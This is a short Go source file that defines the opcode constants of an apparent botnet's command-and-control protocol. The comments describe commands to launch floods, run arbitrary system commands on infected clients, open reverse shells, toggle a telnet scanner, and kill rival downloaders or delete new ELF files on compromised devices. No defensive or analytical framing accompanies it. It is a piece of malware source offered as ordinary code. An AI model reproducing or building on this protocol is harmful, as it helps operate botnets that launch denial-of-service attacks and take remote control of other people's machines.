package clients

const (
	// OpKeyExchange sends a new ChaCha20 encryption key and nonce to the client for secure communication.
	OpKeyExchange = iota

	// OpVerifyExchange confirms the key exchange.
	OpVerifyExchange

	// OpIdentification is used for client identification, providing details such as group name, CPU cores, architecture, and more.
	OpIdentification

	// OpPing serves as the client's heartbeat signal to maintain an active connection with the server.
	OpPing

	// OpFlood instructs the client to initiate a flood.
	OpFlood

	// OpSuicide terminates the bot process, shutting down the client.
	OpSuicide

	// OpLockerMsg is sent by the client upon successfully identifying and killing a downloader or related things.
	OpLockerMsg

	// OpWatchdogMsg is sent by the client after detecting and deleting a new ELF file.
	OpWatchdogMsg

	// OpScanner disables the telnet scanner on the client.
	OpScanner

	// OpLocker toggles the locker functionality on or off.
	OpLocker

	// OpWatchdog toggles the file watchdog functionality on or off.
	OpWatchdog

	// OpSystem executes a specified system command on the client.
	OpSystem

	// OpReverseShell opens a reverse shell
	OpReverseShell
)
